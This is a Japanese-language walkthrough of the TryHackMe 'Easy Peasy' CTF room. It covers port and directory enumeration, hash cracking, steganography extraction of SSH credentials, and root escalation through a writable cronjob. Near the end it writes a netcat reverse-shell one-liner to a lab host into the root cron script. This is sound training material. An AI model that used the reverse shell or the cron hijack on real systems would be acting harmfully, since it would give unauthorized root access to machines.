# Easy Peasy CTF

https://tryhackme.com/room/easypeasyctf

```text
Nmap や GoBuster などのツールを使用して隠しディレクトリを見つけ、脆弱なマシンへの初期アクセスを取得する練習をします。次に、脆弱な cronjob を通じて権限を昇格します。
```
  
パスワードリストも与えられている。

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.162.83
root@ip-10-10-24-81:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-08 00:49 GMT
Nmap scan report for 10.10.162.83
Host is up (0.00019s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
MAC Address: 02:47:FD:4B:60:8F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.52 seconds
root@ip-10-10-24-81:~# sudo nmap -sV -p80,6498,65524 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-08 00:50 GMT
Nmap scan report for 10.10.162.83
Host is up (0.00014s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
MAC Address: 02:47:FD:4B:60:8F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
```

### gobuster

#### 80
```shell
root@ip-10-10-24-81:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.83
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 43]
/hidden               (Status: 301) [Size: 169] [--> http://10.10.162.83/hidden/]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-24-81:~# gobuster dir -x=txt,php -u http://$TARGET/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.83/hidden
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/whatever             (Status: 301) [Size: 169] [--> http://10.10.162.83/hidden/whatever/]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

robots.txt
```text
User-Agent:*
Disallow:/
Robots Not Allowed
```

/hidden/whatever
```html
<p hidden>............==</p>
```

これをデコードしたらフラグ１。


#### 65524

```shell
root@ip-10-10-24-81:~# gobuster dir -x=txt,php -u http://$TARGET:65524 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.83:65524
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 153]
/server-status        (Status: 403) [Size: 280]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

robots.txt
```text
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

User-Agent にこの値を設定してGETすれば何かなると思ったが、何にもならなかった。

```http
GET / HTTP/1.1
Host: 10.10.162.83:65524
User-Agent:a18672860d0510e5ab6699730763b250
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

gobusterのUser-Agent（-aオプション）に設定しても変わらず。

パスワードハッシュのような気がするが、簡単に割れない。後回し。

apacheのデフォルトページにフラグが出ていた。
```
Fl4g 3 : flag{........}
```
これがフラグ３。

また、下記の部分も気になった。
```html
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

Base62デコードすると、/n0th1ng3ls3m4tt3r になる。  
URLにアクセスすると下記を発見。

```html
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
```

```text
 HASH: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
```

GOST R 34.11-94でクラックできた。

```shell
$ hashcat -a 0 -m 6900 hash easypeasy_1596838725703.txt

940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81:mypasswordforthatjob

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 6900 (GOST R 34.11-94)
Hash.Target......: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d14...e6fd81
```

ここまででフラグ２をゲットできていない。  
a18672860d0510e5ab6699730763b250 をクラックする必要があると思われるが、クラックできない。

分からないのでウォークスルーを見た。

https://md5hashing.net/hash

このサイトで、「全てのタイプ」を選択して復号実行すると下記が出てくる。

flag{1m_..........}

しかし、これは全く納得いかない。  

ハッシュと一緒に発見した画像URLをダウンロード

```shell
$ wget http://10.10.162.83:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
```

stegseek

```shell
$ stegseek ./binarycodepixabay.jpg -wl ./easypeasy_1596838725703.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "mypasswordforthatjob"
[i] Original filename: "secrettext.txt".
[i] Extracting to "binarycodepixabay.jpg.out".
```

```shell
$ cat ./binarycodepixabay.jpg.out                                                           
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

https://www.rapidtables.com/convert/number/binary-to-ascii.html  
で、バイナリASCII変換するとパスワードになる。

## SSH

SSH接続できた。

```shell
$ ssh -p 6498 boring@10.10.162.83

boring@kral4-PC:~$ cat ./user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0j.............}
```

ROT13でユーザーフラグになる。

## 権限昇格

冒頭に書かれていた通り、Cronジョブを調査。

```shell
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

```shell
boring@kral4-PC:~$ ls -al /var/www
total 16
drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
#!/bin/bash
# i will run as root
```

どうにでもできるが、リバースシェルにする。

```shell
boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
#!/bin/bash
# i will run as root
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 8888 >/tmp/f
```

listen
```shell
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.162.83] 45776
sh: 0: can't access tty; job control turned off
# ls -al /root
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root  883 Jun 15  2020 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
# cat /root/.root.txt
flag{.................}
```

## 振り返り

- 全体的にちぐはぐで、ところどころ矛盾している。
- フラグ2をクラックするのは不可能であり、パスワードリストにはフラグ3ではなくフラグ2が含まれるべき。（サポートに報告したが話にならない人が窓口にいるので修正されることはないと思う）
